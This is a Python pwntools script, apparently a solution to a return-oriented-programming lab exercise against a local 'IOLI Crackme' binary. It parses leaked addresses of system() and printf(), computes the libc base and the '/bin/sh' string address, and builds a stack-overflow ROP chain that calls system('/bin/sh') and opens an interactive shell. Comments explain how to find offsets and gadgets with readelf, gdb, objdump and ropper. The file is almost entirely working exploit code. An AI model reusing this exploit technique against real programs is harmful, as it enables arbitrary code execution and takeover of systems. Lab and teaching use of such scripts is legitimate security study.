#!/usr/bin/env python3

from pwn import *
from pprint import pprint

p = process("./target", cwd="/home/lab06/tut06-rop")
#receive output from program until it hits this string
out = p.recvuntil("IOLI Crackme Level 0x00")

#this splits the output of the program into a dict where we can
#access the address of each function
#Output ./target: 
# stack   : 0xffe7fcb0
# system(): 0xf7d8e250
# printf(): 0xf7da23a0
# IOLI Crackme Level 0x00
funcs = {}
for l in out.splitlines():
    l = l.strip()
    if b':' in l:
        func, addr = l.split(b':')
        func = func.decode("utf-8").strip()
        addr = int(addr.decode("utf-8").strip(),16)
        funcs[func] = addr
# Get the base of libc by finding a function being called
# ldd target - prints out the libraries linked
# readelf -a ${/bin/libc} | grep ${function_name}
# this readelf will find the offset from the libc loaded
# we can then find the libc base by calculating this offset
libc_base = funcs["printf()"] - 0x00513a0
print("libc_base: %x", libc_base)

# we can find the offset of our target /bin/sh string by running the target
# in gdb and then calculating the offset of libc base and the string inside
# of the running binary
shell_str_offset = 0x17e3cf
binsh_addr = libc_base + shell_str_offset
print("binsh_addr: %x", binsh_addr)

# We can find a pop/ret to pop the printf arguement off the stack and then 
# go to our system() address
# objdump -d -M intel target to find a pop/ret
pop_ret = 0x8048876

# we can use ropper -f ${libc} --string "${string}" to search for the offset as well

exit_offset = 0x00030420
exit_address = libc_base + exit_offset
payload = [
    b'A'*44,
    p32(funcs['printf()']),
    p32(pop_ret),
    p32(binsh_addr),

    p32(funcs['system()']),
    p32(pop_ret),
    p32(binsh_addr),

    p32(exit_address),
    b'AAAA',
    p32(11)
]

print(out)
pprint(funcs)
p.sendline(b"".join(payload))
p.interactive()